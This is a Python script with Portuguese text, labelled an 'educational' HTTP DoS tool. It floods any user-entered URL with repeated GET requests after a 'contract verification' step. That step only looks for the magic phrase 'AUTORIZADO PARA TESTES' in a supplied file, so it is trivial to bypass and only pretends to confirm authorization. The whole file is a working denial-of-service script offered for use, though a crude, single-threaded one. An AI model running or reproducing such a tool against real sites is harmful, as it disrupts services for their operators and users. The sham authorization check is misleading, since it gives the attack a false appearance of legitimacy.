import os
import requests
from time import sleep
from PyPDF2 import PdfReader

# ======= Verifica√ß√£o de contrato ========
def verificar_contrato():
    caminho = input("üìÑ Caminho do contrato (.txt ou .pdf): ").strip()

    if not os.path.exists(caminho):
        print("‚ùå Arquivo n√£o encontrado.")
        exit()

    texto = ""
    if caminho.endswith(".txt"):
        with open(caminho, 'r') as f:
            texto = f.read()
    elif caminho.endswith(".pdf"):
        try:
            leitor = PdfReader(caminho)
            for pagina in leitor.pages:
                texto += pagina.extract_text()
        except:
            print("‚ùå Erro ao ler PDF.")
            exit()
    else:
        print("‚ùå Formato inv√°lido. Use .txt ou .pdf")
        exit()

    if "AUTORIZADO PARA TESTES" not in texto:
        print("‚ùå Contrato inv√°lido. A frase m√°gica n√£o foi encontrada.")
        exit()
    
    print("‚úÖ Contrato verificado com sucesso. Acesso liberado.\n")

# ======= Ataque HTTP Flood (educacional) ========
def http_flood():
    url = input("üåê URL do alvo (com http/https): ")
    try:
        threads = int(input("üîÅ N√∫mero de requisi√ß√µes: "))
    except:
        print("N√∫mero inv√°lido.")
        return

    print(f"\nüöÄ Iniciando ataque HTTP Flood em: {url} com {threads} requisi√ß√µes...\n")
    sucesso = 0
    erro = 0
    for i in range(threads):
        try:
            r = requests.get(url, timeout=3)
            if r.status_code == 200:
                sucesso += 1
            else:
                erro += 1
            print(f"[{i+1}] Status: {r.status_code}")
        except:
            erro += 1
            print(f"[{i+1}] Erro na requisi√ß√£o.")
        sleep(0.1)
    
    print(f"\n‚úÖ Finalizado. Sucesso: {sucesso} | Falhas: {erro}")

# ======= Menu ========
def menu():
    while True:
        print("\n====== HTTP DOS TOOL (Autorizado) ======")
        print("1. Iniciar ataque HTTP Flood")
        print("0. Sair")

        escolha = input("Escolha: ")

        if escolha == "1":
            http_flood()
        elif escolha == "0":
            print("Saindo...")
            break
        else:
            print("Op√ß√£o inv√°lida.")

# ======= Execu√ß√£o principal ========
if __name__ == "__main__":
    verificar_contrato()
    menu()